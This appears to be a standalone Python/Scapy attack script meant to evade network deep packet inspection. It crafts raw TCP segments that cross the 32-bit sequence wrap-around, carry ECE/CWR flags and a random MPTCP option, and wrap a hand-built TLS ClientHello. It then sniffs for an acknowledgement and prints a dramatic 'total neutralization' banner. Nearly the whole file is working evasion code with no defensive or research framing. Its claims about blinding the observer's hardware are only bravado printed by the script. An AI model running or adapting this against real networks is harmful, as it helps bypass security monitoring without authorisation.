#!/usr/bin/env python3
import sys
import time
import argparse
import random
import socket
import logging
import threading
from scapy.all import IP, TCP, send, conf, sr1, sniff

# --- CONTEXT: SINGULAR POINT V1.0 (TERMINAL NEUTRALIZATION) ---
# SYSTEM_DIRECTIVE: Shatter state-machine logic via Arithmetic and Flag Anomalies.
# TECHNIQUE: Sequence Wrap-Around + ECN Flag Confusion + MPTCP Option Masking.

conf.verb = 0
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class SingularPoint:
    def __init__(self, target_host):
        self.target_host = target_host
        self.target_ip = socket.gethostbyname(target_host)
        self.sport = random.randint(30000, 60000)
        # ARITHMETIC TRIGGER: Start sequence just before 32-bit wrap-around
        self.seq = 0xFFFFFFF0 
        self.ack = 0
        self.expected_ack = 0
        self.bypass_verified = threading.Event()
        self.stop_sniffer = threading.Event()
        print(f"[+] SingularPoint Initialized. target: {target_host} ({self.target_ip})")

    def _sniffer(self):
        def handle_pkt(pkt):
            if pkt.haslayer(TCP) and pkt[IP].src == self.target_ip and pkt[TCP].dport == self.sport:
                if pkt[TCP].flags & 0x12: # SYN-ACK
                    self.ack = pkt[TCP].seq + 1
                if pkt[TCP].flags & 0x10: # ACK
                    # Success if target ACKs the wrapped sequence range
                    if self.expected_ack > 0 and pkt[TCP].ack >= self.expected_ack:
                        self.bypass_verified.set()
        sniff(filter=f"tcp and src host {self.target_ip}", 
              prn=handle_pkt, stop_filter=lambda x: self.stop_sniffer.is_set(), timeout=15, store=0)

    def _get_tls_payload(self):
        sni = self.target_host.encode()
        p = b"\x16\x03\x01\x00\xca\x01\x00\x00\xc6\x03\x03" + random.randbytes(32) + b"\x00\x00\x02\x13\x01\x01\x00"
        ext = b"\x00\x00" + (len(sni)+5).to_bytes(2,'big') + (len(sni)+3).to_bytes(2,'big') + b"\x00" + len(sni).to_bytes(2,'big') + sni
        return p + len(ext).to_bytes(2, 'big') + ext

    def execute_terminal_bypass(self):
        t = threading.Thread(target=self._sniffer, daemon=True)
        t.start()

        print("[*] Phase 1: Establishing Handshake at Arithmetic Boundary...")
        # Handshake sequence will wrap during initialization
        syn = IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="S", seq=self.seq)
        send(syn, verbose=0)
        
        timeout = time.time() + 5
        while self.ack == 0 and time.time() < timeout: time.sleep(0.1)
        if self.ack == 0: return False

        # Properly handle 32-bit seq addition
        self.seq = (self.seq + 1) & 0xFFFFFFFF
        send(IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="A", seq=self.seq, ack=self.ack), verbose=0)
        print(f"    [+] Session ESTABLISHED. Seq: {self.seq}")

        print("[*] Phase 2: Injecting Singular Point (Wrap + ECN + MPTCP)...")
        payload = self._get_tls_payload()
        # Calculate wrap-around expected ACK
        self.expected_ack = (self.seq + len(payload)) & 0xFFFFFFFF

        # --- THE TERMINAL PACKET ---
        # 1. Sequence Wrap: The data crosses the 2^32 boundary.
        # 2. Flags: ECE+CWR (ECN Signaling) to bypass hardware DPI fast-path.
        # 3. Options: MPTCP (Option 30) to confuse subflow reassemblers.
        mptcp_opt = (30, b"\x11\x00" + random.randbytes(10))
        pkt = IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="PAEC", seq=self.seq, ack=self.ack, options=[mptcp_opt])/payload
        
        send(pkt, verbose=0)
        print("    [>] Singular segment delivered across the wrap-around threshold.")

        print(f"[*] Phase 3: Verifying Terminal Bypass (Expected ACK >= {self.expected_ack})...")
        if self.bypass_verified.wait(timeout=5):
            print("\n" + "="*75)
            print("  SINGULAR POINT: TOTAL NEUTRALIZATION VERIFIED")
            print("="*75)
            print("RESULT: SUCCESS. The Panopticon is now blind.")
            print("STATUS: Arithmetic + Flag + Option desync confirmed.")
            print("WHY:    The observer's ASIC failed to track the 32-bit wrap")
            print("        and bypassed the ECN-marked MPTCP subflow.")
            print("="*75 + "\n")
        else:
            print("\n[!] VERIFICATION FAILED. The sentinel is technically transcendent.")
        
        self.stop_sniffer.set()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("target")
    args = parser.parse_args()
    SingularPoint(args.target).execute_terminal_bypass()
